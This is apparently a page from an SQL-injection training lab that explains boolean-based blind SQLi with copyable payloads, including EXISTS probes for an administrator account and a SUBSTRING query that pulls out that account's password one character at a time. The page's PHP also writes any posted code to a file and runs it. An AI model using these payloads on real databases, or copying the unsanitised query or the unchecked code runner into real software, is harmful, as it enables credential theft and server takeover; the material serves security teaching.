<?php

$server_var = 'localhost';
$username_var = 'sandbox_user';
$password_var = 'password';
$db_var = 'sample_db';

$code = file_get_contents('code_templates/sqli_blind/sqli_b_bn.php');

$output = "";

if (isset($_POST["code"])) {

    $code = $_POST["code"];

    $myfile = fopen("code.php", "w") ;
    
    fwrite($myfile, $code);
    
    ob_start();
    
    include 'code.php';
    
    $output = ob_get_contents();
    
    ob_end_clean();

}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="/root/css/style.css">
    <link rel="stylesheet" href="/root/codemirror/codemirror.css">
    <link rel="stylesheet" href="/root/codemirror/ayu-dark.css">
    <script src="/root/codemirror/codemirror.js"></script>
    <script src="/root/codemirror/matchbrackets.js"></script>
    <script src="/root/codemirror/htmlmixed.js"></script>
    <script src="/root/codemirror/xml.js"></script>
    <script src="/root/codemirror/javascript.js"></script>
    <script src="/root/codemirror/css.js"></script>
    <script src="/root/codemirror/clike.js"></script>
    <script src="/root/codemirror/php.js"></script>
</head>


<body>

<?php include 'navigation.php'; ?>

<div class="main">

    <div class="row">
        
        <div class="editor_column">

        <h3 style="margin: 0px 0px 10px 0px;">Boolean-Based SQLi</h3>
        
        <p>We'll be focusing on line <b>10</b> and <b>12</b>. </p>
        <p>For line <b>10</b>, the data is stored on the variable <b style="font-family: Courier;">$id</b>. This variable should be properly validated, ensuring that (in this case) only numbers are allowed to be handled, any other form of data is ought to be rejected.</p>
        <p>Moving on to line <b>12</b> the <b style="font-family: Courier;">$id</b> variable which handles the data is directly embedded in the SQL query, this is considered a bad practice as attackers have direct control and can manipulate the SQL directly before it is sends to the database. </p>

        <p>Let's analyse how the earlier attack's work. These are the payload's used (You can copy the payload below and paste it in the value of the <b style="font-family: Courier;">$id</b> variable at line <b>10</b>):</p>
        
        <br>
        <b>Testing if a component is vulnerable to SQLi</b>

        <p>The payloads used at the front end earlier was:</p>

        <ol>

            <li><span class="code_space">1 AND 1 = 2</span> <button class="buttons" onclick="copyTextOne()">Copy</button></li>

                <p>When the payload is replaced with the <b style="font-family: Courier;">$id</b> variable, it will look like this:</p>
                <p><div class="code_space"><span style="color:purple;">SELECT</span> id, name, country <span style="color:purple;">FROM</span> products <span style="color:purple;">WHERE</span> id <span style="color:deeppink">=</span> <span style="color:green;">1</span> AND <span style="color:green;">1</span> <span style="color:deeppink">=</span> <span style="color:green;">2</span>;</div></p>
                <p>When the SQL receives the value AND 1 = 2, it will  return false as 1 does not equate to 2, which will return no entries within the WHERE clause.</p>

            <br>

            <li><span class="code_space">1 AND 1 = 1</span> <button class="buttons" onclick="copyTextTwo()">Copy</button></li>

                <p>When the payload is replaced with the <b style="font-family: Courier;">$id</b> variable, it will look like this:</p>
                <p><div class="code_space"><span style="color:purple;">SELECT</span> id, name, country <span style="color:purple;">FROM</span> products <span style="color:purple;">WHERE</span> id <span style="color:deeppink">=</span> <span style="color:green;">1</span> AND <span style="color:green;">1</span> <span style="color:deeppink">=</span> <span style="color:green;">1</span>;</div></p>
                <p>When the SQL receives the value AND 1 = 1, it will return true as 1 equates to 1, it will return the specified entry within the WHERE clause.</p>

            </ol>

            <br>
            <b>Using the EXISTS operator to perform Boolean Based SQLi</b>

            <p>The following payloads uses the EXISTS operator, the syntax of the command are as of the following:</p>

            <p class="code_space">EXISTS(<span style="color: red;">query</span>)</p>

            <ul>
                <li><p><span class="code_space"><span style="color:red">query</span></span> SQL query is specified here</p></li>
            </ul>
            <p>The function returns 1 (TRUE) if the query returns an entry, otherwise 0 (FALSE).</p>

            <p>The payloads used at the front end earlier was:</p>
            <ol>
            <li><div class="code_space">1 AND EXISTS( SELECT * FROM users WHERE username ='admin')</div> <div style="padding: 5px;"></div> <button class="buttons" onclick="copyTextThree()">Copy</button></li>

                <p>When the payload is replaced with the <b style="font-family: Courier;">$id</b> variable, it will look like this:</p>
                <p class="code_space"><span style="color:purple;">SELECT</span> id, name, country <span style="color:purple;">FROM</span> products <span style="color:purple;">WHERE</span> id <span style="color:deeppink">=</span> <span style="color:green;">1</span> AND <span style="color:purple;">EXISTS</span>( <span style="color:purple;">SELECT</span> <span style="color:deeppink">*</span> <span style="color:purple;">FROM</span> users <span style="color:purple;">WHERE</span> username <span style="color:deeppink">=</span><span style="color:brown"> 'admin' </span>) </p>
                <p>When the SQL receives the command above, SQL will check that if the username 'admin' exist within the users table, in this case a username with admin does not exist within the users table, it will return back 0. So the query now looks like:</p>
                <p class="code_space"><span style="color:purple;">SELECT</span> id, name, country <span style="color:purple;">FROM</span> products <span style="color:purple;">WHERE</span> id <span style="color:deeppink">=</span> <span style="color:green;">1</span> AND <span style="color:green;">0</span></p>
                <p>And as the operator "AND" requires both values to be true, in this case one is true and the other is false and thus, it will not return anything. </p>
                
                <br>

            <li><div class="code_space">1 AND EXISTS( SELECT * FROM users WHERE username ='administrator')</div> <div style="padding: 5px;"></div> <button class="buttons" onclick="copyTextFour()">Copy</button></li>

                <p>When the payload is replaced with the <b style="font-family: Courier;">$id</b> variable, it will look like this:</p>
                <p class="code_space"><span style="color:purple;">SELECT</span> id, name, country <span style="color:purple;">FROM</span> products <span style="color:purple;">WHERE</span> id <span style="color:deeppink">=</span> <span style="color:green;">1</span> AND <span style="color:purple;">EXISTS</span>( <span style="color:purple;">SELECT</span> <span style="color:deeppink">*</span> <span style="color:purple;">FROM</span> users <span style="color:purple;">WHERE</span> username <span style="color:deeppink">=</span><span style="color:brown"> 'administrator' </span>)</p>
                <p>When the SQL receives the command above, SQL will check that if the username 'administrator' exist within the users table, in this case a username with administrator does exist within the users table, it will return back 1. So the query now looks like:</p>
                <p class="code_space"><span style="color:purple;">SELECT</span> id, name, country <span style="color:purple;">FROM</span> products <span style="color:purple;">WHERE</span> id <span style="color:deeppink">=</span> <span style="color:green;">1</span> AND <span style="color:green;">1</span></p>
                <p>As both values at either ends of the "AND" operator is 1, it will be seen as true, so the results of an entry will return. </p>
                

        </ol>

        <br>

        <b>Using the EXISTS operator to perform Boolean Based SQLi</b>

        <p>The following payload uses the SUBSTRING operator, the syntax of the command are the following:</p>

        <p class="code_space">SUBSTRING(<span style="color: red;">string</span>, <span style="color: red;">start</span>, <span style="color: red;">length</span>)</p>

        <ul style="line-height: 30px;">
                <li><p><span class="code_space"><span style="color:red">string</span></span> The string value. </p></li>
                <li><p><span class="code_space"><span style="color:red">start</span></span> The starting position of the string value </p></li>
                <li><p><span class="code_space"><span style="color:red">length</span></span> The number of characters after the starting position to extract </p></li>
        </ul>
        
            <p>The payloads used at the front end earlier was:</p>
        <ol>

            <li><div class="code_space">1 AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'p'</div> <div style="padding: 5px;"></div> <button class="buttons" onclick="copyTextFive()">Copy</button></li>

                <p>When the payload is replaced with the <b style="font-family: Courier;">$id</b> variable, it will look like this:</p>
                <p class="code_space"><span style="color: purple;">SELECT</span> id, name, country <span style="color: purple;">FROM</span> products <span style="color: purple;">WHERE</span> id <span style="color: deeppink;">=</span> <span style="color: green;">1</span> <span style="color: purple;">AND</span> <span style="color: purple;">SUBSTRING</span>((<span style="color: purple;">SELECT</span> password <span style="color: purple;">FROM</span> users <span style="color: purple;">WHERE</span> username <span style="color: deeppink;">=</span> <span style="color: brown;">'administrator'</span>), <span style="color: green;">1</span>, <span style="color: green;">1</span>) <span style="color: deeppink;">=</span> <span style="color: brown;">'p'</span></p>
                <p>When the SQL receives the command above, SQL will run the query within the first parameter and pull the the first character of the SUBSTRING() based on the returned results. So the query will look like:</p>
                <p class="code_space"><span style="color: purple;">SELECT</span> id, name, country <span style="color: purple;">FROM</span> products <span style="color: purple;">WHERE</span> id <span style="color: deeppink;">=</span> <span style="color: green;">1</span> <span style="color: purple;">AND</span> <span style="color: brown;">'p'</span> <span style="color: deeppink;">=</span> <span style="color: brown;">'p'</span></p>
                <p>And as the string 'p' equates to 'p', it will return true. Which equates to:</p>
                <p class="code_space"><span style="color: purple;">SELECT</span> id, name, country <span style="color: purple;">FROM</span> products <span style="color: purple;">WHERE</span> id <span style="color: deeppink;">=</span> <span style="color: green;">1</span> <span style="color: purple;">AND</span> <span style="color: green;">1</span></p>
                <p>And thus, an entry will return.</p>
                

            
        </ol>


        <a href="sqli_blind_front_end.php"><button class="buttons">View Boolean-Based attack front-end</button></a>
        
        </div>

        <div class="output_column code_font">

        
        <div class="output_result">

        <?php echo $output; ?> 

        </div>

        <br>

        <form method="post">
            <input type="submit" value="Run Code >" class="buttons">
            <br>
            <br>
            <textarea id="code" name="code"><?php echo $code; ?></textarea>
            <br>

        </form>

        </div>
        
    </div>
 
    <script>
        var editor = CodeMirror.fromTextArea(document.getElementById("code"), {
            lineNumbers: true,
            matchBrackets: true,
            mode: "application/x-httpd-php",
            indentUnit: 4,
            indentWithTabs: true,
            theme: "ayu-dark"
        });

        editor.setSize(null, '2100px'); 

        function copyTextOne() {
            var copyText = "1 AND 1 = 2";
            navigator.clipboard.writeText(copyText);
        }

        function copyTextTwo() {
            var copyText = "1 AND 1 = 1";
            navigator.clipboard.writeText(copyText);
        }

        function copyTextThree() {
            var copyText = "1 AND EXISTS( SELECT * FROM users WHERE username ='admin')";
            navigator.clipboard.writeText(copyText);
        }

        function copyTextFour() {
            var copyText = "1 AND EXISTS( SELECT * FROM users WHERE username ='administrator')";
            navigator.clipboard.writeText(copyText);
        }

        function copyTextFive() {
            var copyText = "1 AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'p'";
            navigator.clipboard.writeText(copyText);
        }

        function copyTextSix() {
            var copyText = "";
            navigator.clipboard.writeText(copyText);
        }

        function copyTextSeven() {
            var copyText = "";
            navigator.clipboard.writeText(copyText);
        }
    </script>

</div>
</body>
</html>

